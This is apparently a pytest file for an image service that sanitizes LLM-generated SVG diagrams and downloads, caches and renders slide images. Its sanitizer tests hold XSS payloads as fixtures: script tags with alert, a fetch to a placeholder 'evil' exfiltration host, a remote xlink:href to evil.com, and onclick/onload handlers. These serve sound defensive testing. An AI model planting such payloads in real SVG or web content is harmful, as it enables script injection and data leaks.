"""ImageService tests (FASE 4.3).

Covers BP §07.0 contract: sanitize_svg() removes dangerous SVG constructs;
_download_one_image() validates payloads with Pillow and persists via the
image_cache table; prefetch_images() returns ONLY local paths.

Pool, httpx and cairosvg are mocked — no live DB, no live HTTP, no live
cairo runtime touched. Two pure-function tests on sanitize_svg are the
deterministic gate; the rest exercise orchestration with stubs.
"""

from __future__ import annotations

import io
from pathlib import Path
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import httpx
import pytest
from PIL import Image

from app.models.core import SlideType
from app.models.pipeline import ImageStrategy, SlideContent
from app.services import image_service as svc
from app.services.image_service import (
    MAX_IMAGE_BYTES,
    _download_one_image,
    _render_diagram_sync,
    prefetch_images,
    sanitize_svg,
)


# ─────────────── helpers ───────────────


def _slide(
    index: int,
    strategy: str = "web_search",
    *,
    query: str | None = "primo soccorso",
    query_url: str | None = "https://example.com/img.png",
    diagram_code: str | None = None,
) -> SlideContent:
    """FASE 1 vast-hopping: delega a make_slide centralizzato + override image.

    Per strategy='diagram' usiamo SlideType.DIAGRAM; per altri (web_search/none)
    usiamo CONTENT_IMAGE con aspect_hint richiesto.
    """
    from tests._helpers import make_slide

    if strategy == "diagram" and diagram_code:
        # DIAGRAM richiede viewBox 0 0 1760 800
        if 'viewBox="0 0 1760 800"' not in diagram_code:
            # se i test passano SVG generico, wrappo
            diagram_code = (
                f'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1760 800">{diagram_code}</svg>'
            )
        return make_slide(
            SlideType.DIAGRAM,
            index=index,
            image=ImageStrategy(strategy="diagram", diagram_code=diagram_code),
        )
    return make_slide(
        SlideType.CONTENT_IMAGE,
        index=index,
        image=ImageStrategy(
            strategy=strategy,
            query=query,
            query_url=query_url,
            diagram_code=diagram_code,
            aspect_hint="landscape",
        ),
    )


def _png_bytes(color: str = "red", size: tuple[int, int] = (8, 8)) -> bytes:
    buf = io.BytesIO()
    Image.new("RGB", size, color=color).save(buf, "PNG")
    return buf.getvalue()


def _mock_response(content: bytes, status: int = 200) -> Any:
    resp = MagicMock()
    resp.content = content
    resp.raise_for_status = MagicMock()
    if status >= 400:
        resp.raise_for_status.side_effect = httpx.HTTPStatusError(
            "boom", request=MagicMock(), response=MagicMock(status_code=status)
        )
    return resp


def _mock_client(response: Any) -> Any:
    client = MagicMock()
    client.get = AsyncMock(return_value=response)
    return client


def _empty_pool() -> Any:
    """Pool whose cache always misses and whose execute is a noop."""
    pool = MagicMock()
    pool.fetchrow = AsyncMock(return_value=None)
    pool.execute = AsyncMock(return_value=None)
    return pool


# ─────────────── 1. sanitize_svg — pure deterministic ───────────────


def test_sanitize_strips_script_tag() -> None:
    dirty = (
        "<svg><script>alert('xss')</script>"
        '<rect x="0" y="0" width="10" height="10"/></svg>'
    )
    clean = sanitize_svg(dirty)
    assert "<script" not in clean
    assert "alert" not in clean
    assert "<rect" in clean


def test_sanitize_strips_multiline_script() -> None:
    dirty = "<svg><script>\nlet x = 1;\nfetch('http://evil/exfil');\n</script></svg>"
    clean = sanitize_svg(dirty)
    assert "<script" not in clean
    assert "fetch" not in clean


def test_sanitize_strips_foreign_object() -> None:
    dirty = (
        '<svg><foreignObject width="100" height="100">'
        "<body>html injected</body></foreignObject></svg>"
    )
    clean = sanitize_svg(dirty)
    assert "<foreignObject" not in clean
    assert "html injected" not in clean


def test_sanitize_strips_remote_xlink_href() -> None:
    dirty = (
        '<svg><image xlink:href="https://evil.com/leak.png" width="10" '
        'height="10"/></svg>'
    )
    clean = sanitize_svg(dirty)
    assert "xlink:href" not in clean
    assert "evil.com" not in clean


def test_sanitize_keeps_local_xlink_href() -> None:
    """Local fragment refs (#id) are SAFE — must survive sanitization."""
    safe = '<svg><use xlink:href="#circle-template"/></svg>'
    clean = sanitize_svg(safe)
    assert 'xlink:href="#circle-template"' in clean


def test_sanitize_strips_event_handler_attributes() -> None:
    dirty = (
        '<svg><rect onclick="alert(1)" onload="window.parent.x=1" '
        'x="0" y="0" width="10" height="10"/></svg>'
    )
    clean = sanitize_svg(dirty)
    assert "onclick" not in clean
    assert "onload" not in clean
    assert "alert" not in clean
    assert "<rect" in clean


def test_sanitize_idempotent_on_clean_svg() -> None:
    safe = (
        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
        '<rect x="0" y="0" width="50" height="50" fill="red"/>'
        "</svg>"
    )
    assert sanitize_svg(safe) == safe


# ─────────────── 2. _download_one_image — orchestration ───────────────


@pytest.mark.asyncio
async def test_download_uses_cache_when_present() -> None:
    pool = MagicMock()
    pool.fetchrow = AsyncMock(return_value={"local_path": "output/images/cached.png"})
    pool.execute = AsyncMock(return_value=None)
    client = _mock_client(_mock_response(b"unused"))

    idx, path = await _download_one_image(_slide(7), pool, client)

    assert (idx, path) == (7, "output/images/cached.png")
    pool.execute.assert_awaited_once()  # usage_count increment
    client.get.assert_not_called()  # no network on cache hit


@pytest.mark.asyncio
async def test_download_fetches_validates_and_inserts_on_cache_miss(
    tmp_path: Path,
) -> None:
    pool = _empty_pool()
    client = _mock_client(_mock_response(_png_bytes()))

    with patch.object(svc, "IMAGES_DIR", str(tmp_path / "images")):
        idx, path = await _download_one_image(_slide(3), pool, client)

    assert idx == 3
    assert path is not None
    assert path.startswith(str(tmp_path / "images"))
    assert Path(path).is_file()  # PNG actually written
    # INSERT INTO image_cache was issued once (after the SELECT miss).
    assert pool.execute.await_count == 1


@pytest.mark.asyncio
async def test_download_rejects_oversized_payload(tmp_path: Path) -> None:
    pool = _empty_pool()
    oversized = b"\x00" * (MAX_IMAGE_BYTES + 1)
    client = _mock_client(_mock_response(oversized))

    with patch.object(svc, "IMAGES_DIR", str(tmp_path / "images")):
        idx, path = await _download_one_image(_slide(1), pool, client)

    assert (idx, path) == (1, None)
    pool.execute.assert_not_called()  # nothing was cached


@pytest.mark.asyncio
async def test_download_rejects_corrupt_image(tmp_path: Path) -> None:
    pool = _empty_pool()
    client = _mock_client(_mock_response(b"definitely not a png"))

    with patch.object(svc, "IMAGES_DIR", str(tmp_path / "images")):
        idx, path = await _download_one_image(_slide(9), pool, client)

    assert (idx, path) == (9, None)
    pool.execute.assert_not_called()


@pytest.mark.asyncio
async def test_download_handles_http_error_gracefully(tmp_path: Path) -> None:
    pool = _empty_pool()
    client = _mock_client(_mock_response(b"", status=500))

    with patch.object(svc, "IMAGES_DIR", str(tmp_path / "images")):
        idx, path = await _download_one_image(_slide(4), pool, client)

    assert (idx, path) == (4, None)


# ─────────────── 3. _render_diagram_sync — SVG → PNG ───────────────


_VALID_SVG = (
    '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    '<rect x="0" y="0" width="50" height="50" fill="red"/>'
    "</svg>"
)


def test_render_diagram_returns_none_when_no_code() -> None:
    slide = _slide(0, strategy="diagram", diagram_code=None)
    idx, path = _render_diagram_sync(slide)
    assert (idx, path) == (0, None)


def test_render_diagram_writes_png_for_valid_svg(tmp_path: Path) -> None:
    slide = _slide(2, strategy="diagram", diagram_code=_VALID_SVG)
    with patch.object(svc, "DIAGRAMS_DIR", str(tmp_path / "diagrams")):
        idx, path = _render_diagram_sync(slide)
    assert idx == 2
    assert path is not None
    assert Path(path).is_file()
    # Real PNG: opens cleanly with Pillow
    Image.open(path).verify()


def test_render_diagram_sanitizes_before_rendering(tmp_path: Path) -> None:
    """If the LLM emits malicious SVG, sanitize_svg() strips it BEFORE
    cairosvg sees it. Verified by asserting the bytes passed to cairosvg
    no longer contain the script tag.
    """
    dirty = (
        '<svg xmlns="http://www.w3.org/2000/svg" width="50" height="50">'
        "<script>alert(1)</script>"
        '<rect x="0" y="0" width="10" height="10" fill="blue"/>'
        "</svg>"
    )
    slide = _slide(5, strategy="diagram", diagram_code=dirty)

    captured: dict[str, bytes] = {}

    def fake_svg2png(*, bytestring: bytes, **_kw: Any) -> None:
        captured["bs"] = bytestring
        # Still write a small file so the function returns a path.
        write_to = _kw["write_to"]
        Image.new("RGB", (10, 10), "white").save(write_to, "PNG")

    with patch.object(svc, "DIAGRAMS_DIR", str(tmp_path / "diagrams")), patch(
        "app.services.image_service.cairosvg.svg2png", side_effect=fake_svg2png
    ):
        idx, path = _render_diagram_sync(slide)

    assert idx == 5 and path is not None
    sent = captured["bs"].decode()
    assert "<script" not in sent
    assert "alert" not in sent
    assert "<rect" in sent  # legit content preserved


def test_render_diagram_swallows_cairosvg_error(tmp_path: Path) -> None:
    slide = _slide(6, strategy="diagram", diagram_code="<not really svg>")
    with patch.object(svc, "DIAGRAMS_DIR", str(tmp_path / "diagrams")), patch(
        "app.services.image_service.cairosvg.svg2png",
        side_effect=RuntimeError("boom"),
    ):
        idx, path = _render_diagram_sync(slide)
    assert (idx, path) == (6, None)


# ─────────────── 4. prefetch_images — full orchestration ───────────────


@pytest.mark.asyncio
async def test_prefetch_returns_empty_when_no_visual_strategies() -> None:
    pool = _empty_pool()
    slides = [_slide(0, strategy="none", query_url=None)]
    result = await prefetch_images(slides, pool)
    assert result == {}


@pytest.mark.asyncio
async def test_prefetch_skips_web_slides_without_query_url() -> None:
    """FASE 4: una web_search slide SENZA query NÉ query_url non viene
    risolta (search_image ritorna None su query vuota) → nessun download.

    NB: il comportamento è cambiato — se la slide ha ``query`` valorizzato,
    FASE 4 risolve l'URL via search_image. Qui forziamo query vuota +
    query_url None per testare lo skip.
    """
    pool = _empty_pool()
    slide = _slide(0, strategy="web_search", query="primo soccorso", query_url=None)
    # Svuoto query per simulare slide non-risolvibile (edge case)
    object.__setattr__(slide.image, "query", None)
    with patch("app.services.image_service.httpx.AsyncClient") as cls:
        result = await prefetch_images([slide], pool)
    assert result == {}
    cls.assert_not_called()


@pytest.mark.asyncio
async def test_prefetch_returns_only_local_paths_invariant(tmp_path: Path) -> None:
    """BP §07.0 line 2148 invariant: every value in image_map MUST be a
    local filesystem path (never a URL). Verified by asserting no value
    starts with http:// or https:// regardless of upstream behaviour.
    """
    pool = MagicMock()
    pool.fetchrow = AsyncMock(
        return_value={"local_path": "output/images/cached_only.png"}
    )
    pool.execute = AsyncMock(return_value=None)

    slides = [_slide(0), _slide(1)]

    # AsyncClient is constructed and used as async-context-manager — replicate.
    fake_response = _mock_response(_png_bytes())
    fake_client = MagicMock()
    fake_client.get = AsyncMock(return_value=fake_response)
    fake_client_ctx = MagicMock()
    fake_client_ctx.__aenter__ = AsyncMock(return_value=fake_client)
    fake_client_ctx.__aexit__ = AsyncMock(return_value=None)

    with patch("app.services.image_service.httpx.AsyncClient", return_value=fake_client_ctx):
        image_map = await prefetch_images(slides, pool)

    assert image_map  # cache hits returned paths
    for path in image_map.values():
        assert not path.startswith(("http://", "https://"))


@pytest.mark.asyncio
async def test_prefetch_resolves_diagram_slides(tmp_path: Path) -> None:
    pool = _empty_pool()
    slides = [
        _slide(0, strategy="diagram", diagram_code=_VALID_SVG, query_url=None),
        _slide(1, strategy="diagram", diagram_code=None, query_url=None),
    ]
    with patch.object(svc, "DIAGRAMS_DIR", str(tmp_path / "diagrams")):
        image_map = await prefetch_images(slides, pool)
    # slide 0 produced a PNG; slide 1 had no diagram_code → skipped
    assert 0 in image_map
    assert 1 not in image_map
    assert Path(image_map[0]).is_file()


@pytest.mark.asyncio
async def test_prefetch_mixes_web_and_diagram(tmp_path: Path) -> None:
    pool = MagicMock()
    pool.fetchrow = AsyncMock(return_value={"local_path": "output/images/x.png"})
    pool.execute = AsyncMock(return_value=None)

    slides = [
        _slide(0, strategy="web_search"),
        _slide(1, strategy="diagram", diagram_code=_VALID_SVG, query_url=None),
        _slide(2, strategy="none", query_url=None),
    ]

    fake_response = _mock_response(_png_bytes())
    fake_client = MagicMock()
    fake_client.get = AsyncMock(return_value=fake_response)
    fake_client_ctx = MagicMock()
    fake_client_ctx.__aenter__ = AsyncMock(return_value=fake_client)
    fake_client_ctx.__aexit__ = AsyncMock(return_value=None)

    with patch("app.services.image_service.httpx.AsyncClient", return_value=fake_client_ctx), patch.object(
        svc, "DIAGRAMS_DIR", str(tmp_path / "diagrams")
    ):
        image_map = await prefetch_images(slides, pool)

    assert 0 in image_map  # web image (cache hit)
    assert 1 in image_map  # diagram render
    assert 2 not in image_map  # strategy=none → no image


# ─────────────── 5. structural meta-test (FIX-2) ───────────────


def test_sanitize_svg_is_inline_in_image_service() -> None:
    """FIX-2 invariant: sanitize_svg lives INLINE in image_service, NOT in a
    separate utils/svg_sanitizer.py file. Documented by direct import."""
    from app.services import image_service

    assert hasattr(image_service, "sanitize_svg")
    assert image_service.sanitize_svg.__module__ == "app.services.image_service"


# ─────────────── 6. FIX #31 MOSSA 1 — backfill waves removed + retry jitter ───────────────
#
# These tests don't rely on _slide() helper because the pre-existing helper is
# broken vs current validator (D38 in VERIFICATION_DEBT). We build minimal valid
# slides inline.


def _valid_content_image_slide(idx: int, query: str = "test") -> SlideContent:
    """Minimal CONTENT_IMAGE slide that satisfies current validator
    (body_min_bullets=3, notes_min_words=55). Independent of _slide().
    """
    return SlideContent(
        index=idx,
        module_index=0,
        slide_type=SlideType.CONTENT_IMAGE,
        title="Titolo slide test",
        bullets=["Primo punto", "Secondo punto", "Terzo punto"],
        sezioni=[],
        speaker_notes=(
            "Note narrative sufficienti per superare il floor di "
            "cinquantacinque parole richiesto dal validator pydantic; "
            "questo testo serve solo a soddisfare il vincolo nel test "
            "MOSSA uno senza coinvolgere alcuna logica reale. Riempiamo "
            "con parole fino al numero adatto giusto giusto."
        ),
        normative_ref="art. 1",
        source_chunk_ids=["chunk-1"],
        image=ImageStrategy(
            strategy="web_search",
            query=query,
            query_url="https://example.com/img.png",
            aspect_hint="landscape",
        ),
    )


@pytest.mark.asyncio
async def test_download_one_image_retries_once_on_transient_error(
    tmp_path: Path,
) -> None:
    """MOSSA 1: _download_one_image fa 1 retry con jitter sul singolo
    fallimento HTTP transitorio, poi salva. Verifica che il SECONDO
    tentativo abbia successo dopo asyncio.sleep(jitter)."""
    pool = _empty_pool()
    slide = _valid_content_image_slide(7, query="retry test")

    # First call raises (transient), second call returns valid PNG
    call_count = {"n": 0}
    def get_side_effect(*_a: Any, **_kw: Any) -> Any:
        call_count["n"] += 1
        if call_count["n"] == 1:
            raise httpx.ConnectError("transient", request=MagicMock())
        return _mock_response(_png_bytes())

    client = MagicMock()
    client.get = AsyncMock(side_effect=get_side_effect)

    # Mock asyncio.sleep to avoid actually waiting
    with patch.object(svc, "IMAGES_DIR", str(tmp_path / "images")), \
         patch("app.services.image_service.asyncio.sleep", new=AsyncMock()):
        idx, path = await _download_one_image(0, slide, pool, client)

    assert idx == 0
    assert path is not None, "second attempt should succeed"
    assert Path(path).is_file()
    assert call_count["n"] == 2, "expected exactly 1 retry"


@pytest.mark.asyncio
async def test_download_one_image_no_third_attempt(tmp_path: Path) -> None:
    """MOSSA 1: 2 failure consecutivi → return (pos, None), NESSUNA terza
    chiamata. Niente loop di retry illimitato."""
    pool = _empty_pool()
    slide = _valid_content_image_slide(9, query="dead network")

    call_count = {"n": 0}
    def get_side_effect(*_a: Any, **_kw: Any) -> Any:
        call_count["n"] += 1
        raise httpx.ConnectError("dead", request=MagicMock())

    client = MagicMock()
    client.get = AsyncMock(side_effect=get_side_effect)

    with patch.object(svc, "IMAGES_DIR", str(tmp_path / "images")), \
         patch("app.services.image_service.asyncio.sleep", new=AsyncMock()):
        idx, path = await _download_one_image(3, slide, pool, client)

    assert (idx, path) == (3, None)
    assert call_count["n"] == 2, "must NOT do a 3rd attempt"


@pytest.mark.asyncio
async def test_backfill_no_waves_only_branded_fallback(tmp_path: Path) -> None:
    """MOSSA 1: _backfill_missing_images NON chiama più search_image né
    crea httpx.AsyncClient. Per ogni buco, chiama solo _make_branded_fallback
    (Stage 2 di prima, ora unico stage)."""
    from app.services.image_service import _backfill_missing_images

    pool = _empty_pool()
    slides = [_valid_content_image_slide(i, query=f"q{i}") for i in range(3)]
    image_map: dict[int, str] = {}  # tutti e 3 sono buchi

    # Mock _make_branded_fallback per non disegnare PNG vero
    fake_path = str(tmp_path / "branded.png")
    Image.new("RGB", (10, 10), "white").save(fake_path, "PNG")

    with patch(
        "app.services.image_service._make_branded_fallback",
        return_value=fake_path,
    ) as fb, patch(
        "app.services.image_service.httpx.AsyncClient"
    ) as http_cls:
        # Anche se importasse search_image, verifichiamo che NON sia mai chiamato
        # (oltre a mock httpx per essere paranoici sul niente-network)
        await _backfill_missing_images(slides, image_map, pool)

    # Tutti i 3 buchi riempiti con branded fallback
    assert len(image_map) == 3
    assert all(v == fake_path for v in image_map.values())
    # _make_branded_fallback chiamato 3 volte (uno per slide)
    assert fb.call_count == 3
    # Nessun httpx.AsyncClient costruito (no Stage 1 retry)
    http_cls.assert_not_called()


def test_backfill_constants_removed() -> None:
    """MOSSA 1: le costanti del vecchio loop waves sono state rimosse.
    Sostituite da DOWNLOAD_RETRY_JITTER_{MIN,MAX}."""
    from app.services import image_service as svc_mod

    assert not hasattr(svc_mod, "BACKFILL_MAX_SECONDS"), \
        "BACKFILL_MAX_SECONDS removed in FIX #31"
    assert not hasattr(svc_mod, "BACKFILL_WAVE_PAUSE_SECONDS"), \
        "BACKFILL_WAVE_PAUSE_SECONDS removed in FIX #31"
    assert hasattr(svc_mod, "DOWNLOAD_RETRY_JITTER_MIN")
    assert hasattr(svc_mod, "DOWNLOAD_RETRY_JITTER_MAX")
    assert svc_mod.DOWNLOAD_RETRY_JITTER_MIN < svc_mod.DOWNLOAD_RETRY_JITTER_MAX
